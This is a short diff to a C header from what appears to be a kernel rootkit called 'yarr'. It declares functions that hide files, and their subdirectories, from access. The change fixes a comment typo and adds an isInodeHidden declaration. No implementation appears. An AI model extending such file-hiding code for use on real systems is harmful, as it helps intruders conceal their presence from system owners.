@@ -50,7 +50,7 @@ int hideFile(const char __user *filename);
 int stopHideFile(const char __user *filename);
 
 /***
- * Tells whether a file is being (should be) hide or not. A file is hidden if
+ * Tells whether a file is being (should be) hidden or not. A file is hidden if
  * yarr has been asked to hide it or any one of his fathers. For example if
  * yarr is requested to hide /path/dir (a directory) and then someone try to
  * access /path/dir/file (suppose it exists) it will be hidden because its
@@ -60,6 +60,15 @@ int stopHideFile(const char __user *filename);
  * @return: Zero if the file is not being hidden or non-zero elsewhere.
  */
 int isFileHidden(const char __user *filename);
+
+// TODO: This function shouldn't exist, check todo in the implementation.
+/***
+ * Tells whether an inode is being hidden or not.
+ *
+ * @inode: The inode number to search for.
+ * @return: Zero if inode is not being hidden or non-zero if so.
+ */
+int isInodeHidden(long inode);
 
 #endif /* __YARR_NINJA_FILES. */
 
